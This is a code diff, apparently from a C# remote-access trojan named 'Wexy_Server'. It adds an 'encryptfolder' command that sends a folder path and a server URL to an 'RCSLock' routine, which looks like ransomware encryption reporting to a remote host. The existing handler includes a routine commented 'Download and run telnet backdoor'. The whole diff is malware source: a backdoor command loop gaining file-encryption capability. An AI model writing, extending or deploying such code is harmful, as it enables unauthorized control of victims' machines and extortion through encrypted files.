@@ -133,6 +133,11 @@ namespace Wexy_Server
                             string fileName = CommandArray[2];
                             DownloadFile(url,fileName);
                             break;
+                        case "encryptfolder":
+                            string folderpath = CommandArray[1];
+                            string webServerUrl = CommandArray[2];
+                            EncryptFolder(folderpath,webServerUrl);
+                            break;
                     }
                 }
                 catch
@@ -143,12 +148,18 @@ namespace Wexy_Server
         }
 
         #region Commands
+
+        public static void EncryptFolder(string folderpath, string serverUrl)
+        {
+            RCSLock rcs = new RCSLock();
+            rcs.startAction(folderpath,serverUrl);
+        }
+
         public static void DownloadFile(string url, string fileName)
         {
             //Download and run telnet backdoor
             WebClient wb = new WebClient();
             wb.DownloadFile(url, fileName);
-            
         }
 
         // - ALMOST OK - [NOT TESTED YET] 
